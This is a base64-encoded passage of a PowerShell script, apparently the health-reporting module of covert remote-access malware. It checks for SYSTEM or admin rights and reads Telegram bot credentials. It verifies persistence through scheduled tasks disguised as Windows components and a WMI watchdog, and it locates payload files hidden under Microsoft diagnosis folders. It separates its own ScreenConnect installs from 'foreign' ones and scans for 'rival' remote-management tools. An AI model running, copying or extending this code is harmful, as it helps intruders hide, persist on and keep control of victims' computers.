ICAgICAkby5Eb21haW4gPSBpZiAoJGNzLlBhcnRPZkRvbWFpbikgeyAkY3MuRG9tYWluIH0gZWxz
ZSB7ICRjcy5Xb3JrZ3JvdXAgfQogICAgICAgICRvLk1hbnVmYWN0dXJlciA9ICRjcy5NYW51ZmFj
dHVyZXIKICAgICAgICAkby5Nb2RlbCA9ICRjcy5Nb2RlbAogICAgfSBjYXRjaCB7fQogICAgdHJ5
IHsKICAgICAgICAkby5DUFUgPSAoR2V0LUNpbUluc3RhbmNlIFdpbjMyX1Byb2Nlc3NvciB8IFNl
bGVjdC1PYmplY3QgLUZpcnN0IDEgLUV4cGFuZFByb3BlcnR5IE5hbWUpCiAgICB9IGNhdGNoIHt9
CiAgICB0cnkgewogICAgICAgICRvLlNlcmlhbCA9IChHZXQtQ2ltSW5zdGFuY2UgV2luMzJfQklP
UykuU2VyaWFsTnVtYmVyCiAgICB9IGNhdGNoIHt9CiAgICB0cnkgewogICAgICAgICRkID0gR2V0
LUNpbUluc3RhbmNlIFdpbjMyX0xvZ2ljYWxEaXNrIC1GaWx0ZXIgIkRldmljZUlEPSdDOiciCiAg
ICAgICAgJG8uRGlza0ZyZWVfR0IgPSBbbWF0aF06OlJvdW5kKCRkLkZyZWVTcGFjZSAvIDFHQiwg
MSkKICAgICAgICAkby5EaXNrU2l6ZV9HQiA9IFttYXRoXTo6Um91bmQoJGQuU2l6ZSAvIDFHQiwg
MSkKICAgIH0gY2F0Y2gge30KICAgIHJldHVybiAkbwp9CgpmdW5jdGlvbiBHZXQtU3ZjTGluZShb
c3RyaW5nXSRuYW1lKSB7CiAgICAkcyA9IEdldC1TZXJ2aWNlIC1OYW1lICRuYW1lIC1FcnJvckFj
dGlvbiBTaWxlbnRseUNvbnRpbnVlCiAgICBpZiAoLW5vdCAkcykgeyByZXR1cm4gJ05PVCBJTlNU
QUxMRUQnIH0KICAgIHJldHVybiAoJ3swfSAoU3RhcnQ9ezF9KScgLWYgJHMuU3RhdHVzLCAkcy5T
dGFydFR5cGUpCn0KCmZ1bmN0aW9uIEdldC1UYXNrSGVhbHRoKFtzdHJpbmddJHRuKSB7CiAgICAk
b3V0ID0gJiBzY2h0YXNrcy5leGUgL1F1ZXJ5IC9UTiAkdG4gL0ZPIExJU1QgL1YgMj4kbnVsbAog
ICAgaWYgKCRMQVNURVhJVENPREUgLW5lIDAgLW9yIC1ub3QgJG91dCkgewogICAgICAgIHJldHVy
biBAeyBQcmVzZW50ID0gJGZhbHNlOyBTdGF0dXMgPSAnTUlTU0lORyc7IE5leHQgPSAnJzsgTGFz
dCA9ICcnOyBSZXN1bHQgPSAnJzsgT3VycyA9ICRmYWxzZSB9CiAgICB9CiAgICAkbWFwID0gQHt9
CiAgICAkYmxvYiA9ICgkb3V0IHwgRm9yRWFjaC1PYmplY3QgeyAiJF8iIH0pIC1qb2luICJgbiIK
ICAgIGZvcmVhY2ggKCRsaW5lIGluICRvdXQpIHsKICAgICAgICBpZiAoJGxpbmUgLW1hdGNoICde
XHMqKFteOl0rKTpccyooLiopXHMqJCcpIHsKICAgICAgICAgICAgJG1hcFskbWF0Y2hlc1sxXS5U
cmltKCldID0gJG1hdGNoZXNbMl0uVHJpbSgpCiAgICAgICAgfQogICAgfQogICAgJHN0YXR1cyA9
ICRtYXBbJ1N0YXR1cyddCiAgICBpZiAoLW5vdCAkc3RhdHVzKSB7ICRzdGF0dXMgPSAkbWFwWydU
YXNrIFN0YXR1cyddIH0KICAgIGlmICgtbm90ICRzdGF0dXMpIHsgJHN0YXR1cyA9ICdwcmVzZW50
JyB9CiAgICAkbmV4dCA9ICRtYXBbJ05leHQgUnVuIFRpbWUnXQogICAgaWYgKC1ub3QgJG5leHQp
IHsgJG5leHQgPSAnJyB9CiAgICAkbGFzdCA9ICRtYXBbJ0xhc3QgUnVuIFRpbWUnXQogICAgaWYg
KC1ub3QgJGxhc3QpIHsgJGxhc3QgPSAnJyB9CiAgICAkcmVzdWx0ID0gJG1hcFsnTGFzdCBSZXN1
bHQnXQogICAgaWYgKC1ub3QgJHJlc3VsdCkgeyAkcmVzdWx0ID0gJycgfQogICAgJHRyID0gJG1h
cFsnVGFzayBUbyBSdW4nXQogICAgaWYgKC1ub3QgJHRyKSB7ICR0ciA9ICRtYXBbJ1Rhc2sgdG8g
UnVuJ10gfQogICAgJG91cnMgPSAoJGJsb2IgLW1hdGNoICcoP2kpb3duX21vblwuY21kfGV0bF9t
b25cLmNtZHxcLnd1Y2FjaGVcXHxcLmV0bGNhY2hlXFwnKQogICAgIyBQcmVzZW50IFdpbmRvd3Mg
YnVpbHQtaW4gd2l0aCBzYW1lIG5hbWUgaXMgTk9UIGhlYWx0aHkgZm9yIHVzCiAgICAkaGVhbHRo
eSA9ICRvdXJzIC1hbmQgKCgkc3RhdHVzIC1tYXRjaCAnUmVhZHl8UnVubmluZycpIC1vciAoJHN0
YXR1cyAtZXEgJ3ByZXNlbnQnKSkKICAgIHJldHVybiBAewogICAgICAgIFByZXNlbnQgPSAkdHJ1
ZQogICAgICAgIE91cnMgICAgPSBbYm9vbF0kb3VycwogICAgICAgIEhlYWx0aHkgPSBbYm9vbF0k
aGVhbHRoeQogICAgICAgIFN0YXR1cyAgPSAkKGlmICgkb3VycykgeyAkc3RhdHVzIH0gZWxzZSB7
ICdOT1RfT1VSUycgfSkKICAgICAgICBOZXh0ICAgID0gJG5leHQKICAgICAgICBMYXN0ICAgID0g
JGxhc3QKICAgICAgICBSZXN1bHQgID0gJHJlc3VsdAogICAgICAgIFRyICAgICAgPSAkKGlmICgk
dHIpIHsgJHRyIH0gZWxzZSB7ICcnIH0pCiAgICB9Cn0KCmZ1bmN0aW9uIEdldC1SbW1IaXRzIHsK
ICAgICMgRGV0ZWN0IHJpdmFscyBmb3IgVGVsZWdyYW0uIEtFRVA6IFNjcmVlbkNvbm5lY3QgYWxs
b3dsaXN0ICsgRGF0dG8vQ2VudHJhU3RhZ2UuCiAgICAkdG9rZW5zID0gQCgKICAgICAgICAnQW55
RGVzaycsICdUZWFtVmlld2VyJywgJ3R2bnNlcnZlcicsICdEV0FnZW50JywgJ0RXU2VydmljZScs
ICdMb2dNZUluJywgJ0xNSUd1YXJkaWFuJywKICAgICAgICAnV2luVk5DJywgJ3ZuY3NlcnZlcics
ICd0dl8nLCAnU3BsYXNodG9wJywgJ1pvaG8gQXNzaXN0JywgJ1J1c3REZXNrJywgJ1JlbW90ZVBD
JywgJ0RhbWVXYXJlJywKICAgICAgICAnQXRlcmFBZ2VudCcsICdBdGVyYScsICdOaW5qYVJNTScs
ICdOaW5qYU9uZScsICdOaW5qYVJNTUFnZW50JywgJ0thc2V5YScsICdBZ2VudE1vbicsICdQdWxz
ZXdheScsICdQQyBNb25pdG9yJywgJ1N5bmNybycsICdLYWJ1dG8nLAogICAgICAgICdTdXBlck9w
cycsICdNYW5hZ2VFbmdpbmUnLCAnVUVNUycsICdEZXNrdG9wIENlbnRyYWwnLCAnRW5kcG9pbnQg
Q2VudHJhbCcsICdTb2xhcldpbmRzIE1TUCcsICdDb25uZWN0V2lzZSBBdXRvbWF0ZScsICdMVFNl
cnZpY2UnLCAnTGFiVGVjaCcsCiAgICAgICAgJ0FjdGlvbjEnLCAnU2ltcGxlSGVscCcsICdCb21n
YXInLCAnQmV5b25kVHJ1c3QnLCAnTWVzaEFnZW50JywgJ01lc2ggQ2VudHJhbCcsICdNZXNoIEFn
ZW50JywKICAgICAgICAnVGFjdGljYWxSTU0nLCAndGFjdGljYWxybW0nLCAnR2V0U2NyZWVuJywg
J1N1cHJlbW8nLCAncnV0c2VydicsICdyZW1vdGluZ19ob3N0JywKICAgICAgICAnQ2hyb21lIFJl
bW90ZSBEZXNrdG9wJywgJ1BhcnNlYycsICdOZXRTdXBwb3J0JywgJ0xldmVsLmlvJywgJ0xldmVs
IEFnZW50JywKICAgICAgICAnQ29udGludXVtJywgJ1NBQVonLCAnTmF2ZXJpc2snLCAnSW1teUJv
dCcsICdBdXRvbW94JywgJ2FtYWdlbnQnLCAnQWNyb25pcyBDeWJlcicsICdEb21vdHonLCAnQXV2
aWsnLAogICAgICAgICdCYXJyYWN1ZGEgUk1NJywgJ01hbmFnZWQgV29ya3BsYWNlJywgJ0dvdmVy
bGFuJywgJ1BEUSBEZXBsb3knLCAnUERRIEludmVudG9yeScsICdQRFEgQ29ubmVjdCcsCiAgICAg
ICAgJ04tYWJsZScsICdOLWNlbnRyYWwnLCAnTi1zaWdodCcsICdUYWtlIENvbnRyb2wnLCAnQWR2
YW5jZWQgTW9uaXRvcmluZyBBZ2VudCcsICdVbHRyYVZpZXdlcicsICdBZXJvQWRtaW4nLAogICAg
ICAgICdMaXRlTWFuYWdlcicsICdSYWRtaW4nLCAnTm9NYWNoaW5lJywgJ0lwZXJpdXMnLCAnSVNM
IExpZ2h0JywgJ0FtbXl5JywgJ1RpZ2h0Vk5DJywgJ1VsdHJhVk5DJywgJ1JlYWxWTkMnCiAgICAp
CiAgICAka2VlcFRva2VucyA9IEAoJ0RhdHRvJywgJ0NlbnRyYVN0YWdlJywgJ0NhZ1NlcnZpY2Un
LCAnQXV0b3Rhc2tFbmRwb2ludCcpCiAgICAkaGl0cyA9IE5ldy1PYmplY3QgU3lzdGVtLkNvbGxl
Y3Rpb25zLkdlbmVyaWMuTGlzdFtzdHJpbmddCiAgICAkc2VlbiA9IEB7fQoKICAgIGZ1bmN0aW9u
IEFkZC1IaXQoW3N0cmluZ10ka2luZCwgW3N0cmluZ10kbmFtZSkgewogICAgICAgICRrZXkgPSAi
JGtpbmR8JG5hbWUiLlRvTG93ZXJJbnZhcmlhbnQoKQogICAgICAgIGlmICgkc2Vlbi5Db250YWlu
c0tleSgka2V5KSkgeyByZXR1cm4gfQogICAgICAgICRzZWVuWyRrZXldID0gJHRydWUKICAgICAg
ICBbdm9pZF0kaGl0cy5BZGQoKCctIFt7MH1dIDxjb2RlPnsxfTwvY29kZT4nIC1mICRraW5kLCAo
RXNjICRuYW1lKSkpCiAgICB9CiAgICBmdW5jdGlvbiBUZXN0LUtlZXBOYW1lKFtzdHJpbmddJHMp
IHsKICAgICAgICBpZiAoLW5vdCAkcykgeyByZXR1cm4gJGZhbHNlIH0KICAgICAgICBpZiAoJHMg
LWxpa2UgJypTY3JlZW5Db25uZWN0KicpIHsgcmV0dXJuICR0cnVlIH0KICAgICAgICBmb3JlYWNo
ICgkayBpbiAka2VlcFRva2VucykgeyBpZiAoJHMgLWxpa2UgIiokayoiKSB7IHJldHVybiAkdHJ1
ZSB9IH0KICAgICAgICByZXR1cm4gJGZhbHNlCiAgICB9CgogICAgR2V0LVNlcnZpY2UgLUVycm9y
QWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgJG4gPSAk
Xy5OYW1lCiAgICAgICAgJGQgPSAkXy5EaXNwbGF5TmFtZQogICAgICAgIGlmIChUZXN0LUtlZXBO
YW1lICRuIC1vciBUZXN0LUtlZXBOYW1lICRkKSB7CiAgICAgICAgICAgIGlmICgkbiAtbGlrZSAn
KkNlbnRyYVN0YWdlKicgLW9yICRkIC1saWtlICcqRGF0dG8qJyAtb3IgJG4gLWxpa2UgJypDYWdT
ZXJ2aWNlKicpIHsKICAgICAgICAgICAgICAgIEFkZC1IaXQgJ2tlZXAtZGF0dG8nICgiJG4gKCQo
JF8uU3RhdHVzKSkiKQogICAgICAgICAgICB9CiAgICAgICAgICAgIHJldHVybgogICAgICAgIH0K
ICAgICAgICBmb3JlYWNoICgkdCBpbiAkdG9rZW5zKSB7CiAgICAgICAgICAgIGlmICgkbiAtbGlr
ZSAiKiR0KiIgLW9yICRkIC1saWtlICIqJHQqIikgewogICAgICAgICAgICAgICAgQWRkLUhpdCAn
c3ZjJyAoIiRuICgkKCRfLlN0YXR1cykpIikKICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAg
ICAgIH0KICAgICAgICB9CiAgICB9CgogICAgR2V0LVByb2Nlc3MgLUVycm9yQWN0aW9uIFNpbGVu
dGx5Q29udGludWUgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgJG4gPSAkXy5Qcm9jZXNzTmFt
ZQogICAgICAgIGlmIChUZXN0LUtlZXBOYW1lICRuKSB7IHJldHVybiB9CiAgICAgICAgZm9yZWFj
aCAoJHQgaW4gJHRva2VucykgewogICAgICAgICAgICBpZiAoJG4gLWxpa2UgIiokdCoiKSB7CiAg
ICAgICAgICAgICAgICBBZGQtSGl0ICdwcm9jJyAkbgogICAgICAgICAgICAgICAgYnJlYWsKICAg
ICAgICAgICAgfQogICAgICAgIH0KICAgIH0KCiAgICAkdW5pbnN0ID0gQCgKICAgICAgICAnSEtM
TTpcU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cVW5pbnN0YWxsXCon
LAogICAgICAgICdIS0xNOlxTT0ZUV0FSRVxXT1c2NDMyTm9kZVxNaWNyb3NvZnRcV2luZG93c1xD
dXJyZW50VmVyc2lvblxVbmluc3RhbGxcKicKICAgICkKICAgIGZvcmVhY2ggKCRwYXRoIGluICR1
bmluc3QpIHsKICAgICAgICBHZXQtSXRlbVByb3BlcnR5ICRwYXRoIC1FcnJvckFjdGlvbiBTaWxl
bnRseUNvbnRpbnVlIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAkZG4gPSAkXy5EaXNw
bGF5TmFtZQogICAgICAgICAgICBpZiAoLW5vdCAkZG4pIHsgcmV0dXJuIH0KICAgICAgICAgICAg
aWYgKFRlc3QtS2VlcE5hbWUgJGRuKSB7CiAgICAgICAgICAgICAgICBpZiAoJGRuIC1saWtlICcq
RGF0dG8qJyAtb3IgJGRuIC1saWtlICcqQ2VudHJhU3RhZ2UqJykgeyBBZGQtSGl0ICdrZWVwLWRh
dHRvJyAkZG4gfQogICAgICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgICAgIH0KICAgICAgICAg
ICAgaWYgKCRkbiAtbGlrZSAnU2NyZWVuQ29ubmVjdConKSB7IHJldHVybiB9CiAgICAgICAgICAg
IGZvcmVhY2ggKCR0IGluICR0b2tlbnMpIHsKICAgICAgICAgICAgICAgIGlmICgkZG4gLWxpa2Ug
IiokdCoiKSB7CiAgICAgICAgICAgICAgICAgICAgQWRkLUhpdCAnbXNpJyAkZG4KICAgICAgICAg
ICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAg
fQogICAgfQoKICAgIHJldHVybiAkaGl0cwp9CgpmdW5jdGlvbiBHZXQtU2NJbnN0YWxscyB7CiAg
ICAkbGlzdCA9IE5ldy1PYmplY3QgU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuTGlzdFtzdHJp
bmddCiAgICBHZXQtU2VydmljZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8IFdoZXJl
LU9iamVjdCB7ICRfLk5hbWUgLWxpa2UgJ1NjcmVlbkNvbm5lY3QgQ2xpZW50KicgfSB8IEZvckVh
Y2gtT2JqZWN0IHsKICAgICAgICAkZnAgPSBpZiAoJF8uTmFtZSAtbWF0Y2ggJ1woKFswLTlhLWZd
ezE2fSlcKScpIHsgJG1hdGNoZXNbMV0gfSBlbHNlIHsgJz8nIH0KICAgICAgICAkdGFnID0gaWYg
KCRmcCAtZXEgJzVmNjAxMDU3OTg1MmU1MDcnKSB7ICdLRUVQLVNFVlJaJyB9CiAgICAgICAgZWxz
ZWlmICgkZnAgLWVxICdmODYxYzgxNDBkNDUzNDI3JykgeyAnS0VFUC1BTFQnIH0KICAgICAgICBl
bHNlaWYgKCRmcCAtZXEgJzk5MDgxOThlNjY4ZTQ3NTAnKSB7ICdLRUVQLUdSWVhBJyB9CiAgICAg
ICAgZWxzZSB7ICdGT1JFSUdOJyB9CiAgICAgICAgW3ZvaWRdJGxpc3QuQWRkKCgnLSA8Y29kZT57
MH08L2NvZGU+OiA8Yj57MX08L2I+IFt7Mn1dJyAtZiAoRXNjICRfLk5hbWUpLCAoRXNjIChbc3Ry
aW5nXSRfLlN0YXR1cykpLCAkdGFnKSkKICAgIH0KCiAgICAkcm9vdHMgPSBAKAogICAgICAgICIk
e2VudjpQcm9ncmFtRmlsZXN9XFNjcmVlbkNvbm5lY3QgQ2xpZW50KiIsCiAgICAgICAgIiR7ZW52
OlByb2dyYW1GaWxlcyh4ODYpfVxTY3JlZW5Db25uZWN0IENsaWVudCoiCiAgICApCiAgICBmb3Jl
YWNoICgkcGF0IGluICRyb290cykgewogICAgICAgIEdldC1DaGlsZEl0ZW0gLVBhdGggJHBhdCAt
RGlyZWN0b3J5IC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgRm9yRWFjaC1PYmplY3Qg
ewogICAgICAgICAgICBbdm9pZF0kbGlzdC5BZGQoKCctIHBhdGg6IDxjb2RlPnswfTwvY29kZT4n
IC1mIChFc2MgJF8uRnVsbE5hbWUpKSkKICAgICAgICB9CiAgICB9CgogICAgJHVuaW5zdCA9IEAo
CiAgICAgICAgJ0hLTE06XFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9u
XFVuaW5zdGFsbFwqJywKICAgICAgICAnSEtMTTpcU09GVFdBUkVcV09XNjQzMk5vZGVcTWljcm9z
b2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cVW5pbnN0YWxsXConCiAgICApCiAgICBmb3JlYWNo
ICgkcGF0aCBpbiAkdW5pbnN0KSB7CiAgICAgICAgR2V0LUl0ZW1Qcm9wZXJ0eSAkcGF0aCAtRXJy
b3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8IFdoZXJlLU9iamVjdCB7CiAgICAgICAgICAgICRf
LkRpc3BsYXlOYW1lIC1saWtlICcqU2NyZWVuQ29ubmVjdConCiAgICAgICAgfSB8IEZvckVhY2gt
T2JqZWN0IHsKICAgICAgICAgICAgJHZlciA9IGlmICgkXy5EaXNwbGF5VmVyc2lvbikgeyAkXy5E
aXNwbGF5VmVyc2lvbiB9IGVsc2UgeyAnPycgfQogICAgICAgICAgICBbdm9pZF0kbGlzdC5BZGQo
KCctIG1zaTogPGNvZGU+ezB9PC9jb2RlPiB2ezF9JyAtZiAoRXNjICRfLkRpc3BsYXlOYW1lKSwg
KEVzYyAkdmVyKSkpCiAgICAgICAgfQogICAgfQoKICAgIGlmICgkbGlzdC5Db3VudCAtZXEgMCkg
eyBbdm9pZF0kbGlzdC5BZGQoJy0gKG5vbmUpJykgfQogICAgcmV0dXJuICRsaXN0Cn0KCiRjZmcg
PSBHZXQtQ2ZnCmlmICgtbm90ICRjZmcuQk9UX1RPS0VOIC1vciAtbm90ICRjZmcuQ0hBVF9JRCkg
ewogICAgQWRkLUNvbnRlbnQgLUxpdGVyYWxQYXRoIChKb2luLVBhdGggJFdvcmtEaXIgJ2Jvb3Qu
ZXJyJykgLVZhbHVlICd0Z19za2lwX25vX2NmZycgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGlu
dWUKICAgIGV4aXQgMgp9CgokcHJpbSA9ICdTY3JlZW5Db25uZWN0IENsaWVudCAoNWY2MDEwNTc5
ODUyZTUwNyknCiRhbHQgPSAnU2NyZWVuQ29ubmVjdCBDbGllbnQgKGY4NjFjODE0MGQ0NTM0Mjcp
Jwokb3MgPSBHZXQtT3NJbmZvCiR3aG8gPSBbU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NJZGVu
dGl0eV06OkdldEN1cnJlbnQoKS5OYW1lCiRlbGV2ID0gKFtTZWN1cml0eS5QcmluY2lwYWwuV2lu
ZG93c1ByaW5jaXBhbF1bU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NJZGVudGl0eV06OkdldEN1
cnJlbnQoKSkuSXNJblJvbGUoCiAgICBbU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NCdWlsdElu
Um9sZV06OkFkbWluaXN0cmF0b3IpCiRpc1N5c3RlbSA9ICR3aG8gLWxpa2UgJypTWVNURU0qJyAt
b3IgJHdobyAtZXEgJ05UIEFVVEhPUklUWVxTWVNURU0nCgokbXNpQ2FjaGUgPSBKb2luLVBhdGgg
JFdvcmtEaXIgJ3BrZy5tc2knCiRtc2lTaXplID0gaWYgKFRlc3QtUGF0aCAkbXNpQ2FjaGUpIHsK
ICAgICd7MDpOMH0gS0InIC1mICgoR2V0LUl0ZW0gJG1zaUNhY2hlIC1Gb3JjZSkuTGVuZ3RoIC8g
MUtCKQp9IGVsc2UgeyAnbm9uZScgfQoKJG1vblBhdGggPSBKb2luLVBhdGggJFdvcmtEaXIgJ293
bl9tb24uY21kJwokZXRsTW9uID0gIiRlbnY6UHJvZ3JhbURhdGFcTWljcm9zb2Z0XERpYWdub3Np
c1xTdGF0ZVwuZXRsY2FjaGVcZXRsX21vbi5jbWQiCiRoYXNNb24gPSBUZXN0LVBhdGggJG1vblBh
dGgKJGhhc0V0bCA9IFRlc3QtUGF0aCAkZXRsTW9uCgojIFQxMDogb24tZGlzayBwYXlsb2FkIGJ1
aWxkIG1hcmtlcnMgLT4gZXZlcnkgcmVwb3J0IHByb3ZlcyBleGFjdGx5IHdoYXQgaXMgaW5zdGFs
bGVkCmZ1bmN0aW9uIEdldC1QYXlsb2FkQnVpbGQoW3N0cmluZ10kZmlsZSkgewogICAgaWYgKC1u
b3QgKFRlc3QtUGF0aCAkZmlsZSkpIHsgcmV0dXJuICdtaXNzaW5nJyB9CiAgICBmb3JlYWNoICgk
bCBpbiAoR2V0LUNvbnRlbnQgLUxpdGVyYWxQYXRoICRmaWxlIC1Ub3RhbENvdW50IDggLUZvcmNl
IC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlKSkgewogICAgICAgIGlmICgkbCAtbWF0Y2gg
J0JVSUxEXHMrXGR7OH0oW0EtWl0rXGQrKScpIHsgcmV0dXJuICRtYXRjaGVzWzFdIH0KICAgIH0K
ICAgIHJldHVybiAnPycKfQokYk1vbiA9IEdldC1QYXlsb2FkQnVpbGQgKEpvaW4tUGF0aCAkV29y
a0RpciAnb3duX21vbi5jbWQnKQokYlNlYyA9IEdldC1QYXlsb2FkQnVpbGQgKEpvaW4tUGF0aCAk
V29ya0RpciAnb3duX3NlY3VyZS5jbWQnKQokYlRnciA9IEdldC1QYXlsb2FkQnVpbGQgKEpvaW4t
UGF0aCAkV29ya0RpciAndGdfcmVwb3J0LnBzMScpCiRiTGliID0gR2V0LVBheWxvYWRCdWlsZCAo
Sm9pbi1QYXRoICRXb3JrRGlyICdvd25fbGliLnBzMScpCgojIHBlci1ob3N0IGlkZW50aXR5OiBl
eHBlY3RlZCB0YXNrIG5hbWVzIGNvbWUgZnJvbSBpZGVudGl0eS5jZmcgd2hlbiBwcmVzZW50CiRp
ZENmZyA9IEpvaW4tUGF0aCAkV29ya0RpciAnaWRlbnRpdHkuY2ZnJwokaWRNYXAgPSBAe30KaWYg
KFRlc3QtUGF0aCAkaWRDZmcpIHsKICAgIEdldC1Db250ZW50IC1MaXRlcmFsUGF0aCAkaWRDZmcg
fCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgaWYgKCRfIC1tYXRjaCAnXlxzKihbQS1aX10rKVxz
Kj1ccyooLis/KVxzKiQnKSB7ICRpZE1hcFskbWF0Y2hlc1sxXV0gPSAkbWF0Y2hlc1syXSB9CiAg
ICB9Cn0KJGV4cGVjdGVkVGFza3MgPSBAKAogICAgQHsgTmFtZSA9ICQoaWYgKCRpZE1hcC5UQVNL
X0EpIHsgJGlkTWFwLlRBU0tfQSB9IGVsc2UgeyAnV2VyUXVldWVTeW5jJyB9KTsgUm9sZSA9ICJ0
aWNrICQoJGlkTWFwLk1PX0EpbSAoY2hhaW4xKSIgfSwKICAgIEB7IE5hbWUgPSAkKGlmICgkaWRN
YXAuVEFTS19CKSB7ICRpZE1hcC5UQVNLX0IgfSBlbHNlIHsgJ1BsYVNlcnZlckhlYWx0aCcgfSk7
IFJvbGUgPSAiYmFja3VwICQoJGlkTWFwLk1PX0IpbSAoY2hhaW4xKSIgfSwKICAgIEB7IE5hbWUg
PSAkKGlmICgkaWRNYXAuVEFTS19DKSB7ICRpZE1hcC5UQVNLX0MgfSBlbHNlIHsgJ1dkaUhvc3RQ
cm94eScgfSk7IFJvbGUgPSAnT05TVEFSVCAoY2hhaW4xKScgfSwKICAgIEB7IE5hbWUgPSAkKGlm
ICgkaWRNYXAuVEFTS19EKSB7ICRpZE1hcC5UQVNLX0QgfSBlbHNlIHsgJ1RjcElwQ29uZmxpY3RS
ZXMnIH0pOyBSb2xlID0gJ09OTE9HT04gKGNoYWluMSknIH0KKQojIGNoYWluIDI6IFdNSSB3YXRj
aGRvZyBzdWJzY3JpcHRpb24KJHdtaUMgPSBHZXQtV21pT2JqZWN0IC1OYW1lc3BhY2Ugcm9vdFxz
dWJzY3JpcHRpb24gLUNsYXNzIENvbW1hbmRMaW5lRXZlbnRDb25zdW1lciAtRmlsdGVyICJOYW1l
PSdXdWNhY2hlV2F0Y2hkb2dDJyIgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUKJGV4cGVj
dGVkVGFza3MgKz0gQHsgTmFtZSA9ICdcV01JXFd1Y2FjaGVXYXRjaGRvZ0MnOyBSb2xlID0gJ3Rp
bWVyIDNtIChjaGFpbjIpJzsgV21pID0gKCRudWxsIC1uZSAkd21pQykgfQoKJHRhc2tMaW5lcyA9
IE5ldy1PYmplY3QgU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuTGlzdFtzdHJpbmddCiR0YXNr
T2sgPSAwCiR0YXNrQmFkID0gMApmb3JlYWNoICgkdCBpbiAkZXhwZWN0ZWRUYXNrcykgewogICAg
aWYgKCR0LkNvbnRhaW5zS2V5KCdXbWknKSkgewogICAgICAgIGlmICgkdC5XbWkpIHsgJHRhc2tP
aysrOyAkbWFyayA9ICdPSycgfSBlbHNlIHsgJHRhc2tCYWQrKzsgJG1hcmsgPSAnTUlTU0lORycg
fQogICAgICAgIFt2b2lkXSR0YXNrTGluZXMuQWRkKCgnLSBbezB9XSA8Y29kZT57MX08L2NvZGU+
IC0gezJ9JyAtZiAkbWFyaywgKEVzYyAkdC5OYW1lKSwgKEVzYyAkdC5Sb2xlKSkpCiAgICAgICAg
Y29udGludWUKICAgIH0KICAgICRoID0gR2V0LVRhc2tIZWFsdGggJHQuTmFtZQogICAgaWYgKCRo
LlByZXNlbnQgLWFuZCAkaC5IZWFsdGh5KSB7CiAgICAgICAgJHRhc2tPaysrCiAgICAgICAgJG1h
cmsgPSAnT0snCiAgICB9IGVsc2VpZiAoJGguUHJlc2VudCAtYW5kIC1ub3QgJGguT3Vycykgewog
ICAgICAgICR0YXNrQmFkKysKICAgICAgICAkbWFyayA9ICdOT1RfT1VSUycKICAgIH0gZWxzZWlm
ICgkaC5QcmVzZW50KSB7CiAgICAgICAgJHRhc2tCYWQrKwogICAgICAgICRtYXJrID0gJ1dFQUsn
CiAgICB9IGVsc2UgewogICAgICAgICR0YXNrQmFkKysKICAgICAgICAkbWFyayA9ICdNSVNTSU5H
JwogICAgfQogICAgJGV4dHJhID0gJycKICAgIGlmICgkaC5QcmVzZW50KSB7CiAgICAgICAgJGJp
dHMgPSBAKCkKICAgICAgICBpZiAoJGguU3RhdHVzKSB7ICRiaXRzICs9ICRoLlN0YXR1cyB9CiAg
ICAgICAgaWYgKCRoLlJlc3VsdCAtbmUgJycgLWFuZCAkaC5SZXN1bHQgLW5lICcwJykgeyAkYml0
cyArPSAoIkxhc3RSZXN1bHQ9IiArICRoLlJlc3VsdCkgfQogICAgICAgIGlmICgkYml0cy5Db3Vu
dCkgeyAkZXh0cmEgPSAnICgnICsgKCRiaXRzIC1qb2luICcsICcpICsgJyknIH0KICAgIH0KICAg
IFt2b2lkXSR0YXNrTGluZXMuQWRkKCgnLSBbezB9XSA8Y29kZT57MX08L2NvZGU+IC0gezJ9ezN9
JyAtZiAkbWFyaywgKEVzYyAkdC5OYW1lKSwgKEVzYyAkdC5Sb2xlKSwgKEVzYyAkZXh0cmEpKSkK
fQoKJHByaW1MaW5lID0gR2V0LVN2Y0xpbmUgJHByaW0KJGFsdExpbmUgPSBHZXQtU3ZjTGluZSAk
YWx0CiRwcmltT2sgPSAkcHJpbUxpbmUgLWxpa2UgJ1J1bm5pbmcqJwokZGVwbG95T2sgPSAkcHJp
bU9rIC1hbmQgKCR0YXNrT2sgLWdlIDMpIC1hbmQgJGhhc01vbgoKJGVtb2ppTWFwID0gQHsKICAg
IE9LICAgICAgID0gW3N0cmluZ10oW2NoYXJdMHgyNzA1KQogICAgRE9XTiAgICAgPSAoW3N0cmlu
Z11bY2hhcl06OkNvbnZlcnRGcm9tVXRmMzIoMHgxRjZBOCkpCiAgICBSRVNUT1JFRCA9IChbc3Ry
aW5nXVtjaGFyXTo6Q29udmVydEZyb21VdGYzMigweDFGN0UyKSkKICAgIEZBSUwgICAgID0gW3N0
cmluZ10oW2NoYXJdMHgyNzRDKQogICAgRk9SQ0UgICAgPSBbc3RyaW5nXShbY2hhcl0weDI2QTEp
CiAgICBERVBMT1kgICA9IChbc3RyaW5nXVtjaGFyXTo6Q29udmVydEZyb21VdGYzMigweDFGNjgw
KSkKICAgIEhCICAgICAgID0gKFtzdHJpbmddW2NoYXJdOjpDb252ZXJ0RnJvbVV0ZjMyKDB4MUY0
RTEpKQp9CiRrZXkgPSAkU3RhdGUuVG9VcHBlckludmFyaWFudCgpCiRlbW9qaSA9IGlmICgkZW1v
